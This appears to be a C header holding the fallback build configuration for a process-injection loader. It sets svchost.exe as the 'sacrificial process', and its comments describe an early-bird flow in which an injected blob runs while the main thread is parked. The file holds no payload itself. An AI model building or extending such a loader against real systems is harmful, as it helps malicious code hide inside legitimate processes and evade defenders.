/*
 * Build-time configuration of the generated loader. build.sh regenerates
 * this file from the module parameters; the committed copy below is only a
 * fallback so the loader still compiles when built by hand.
 */
#ifndef SVC_LOADER_CONFIG_H
#define SVC_LOADER_CONFIG_H

/* Sacrificial process: a bare name is resolved under System32, anything with
 * a path separator or drive letter is used verbatim. */
#define SACRIFICIAL_PROCESS L"svchost.exe"

/* Optional command line passed to the sacrificial process. The primary
 * thread is parked right after the injected blob runs, so in the early-bird
 * flow these arguments are never seen by the process. */
#define SACRIFICIAL_ARGS L""

#endif /* SVC_LOADER_CONFIG_H */
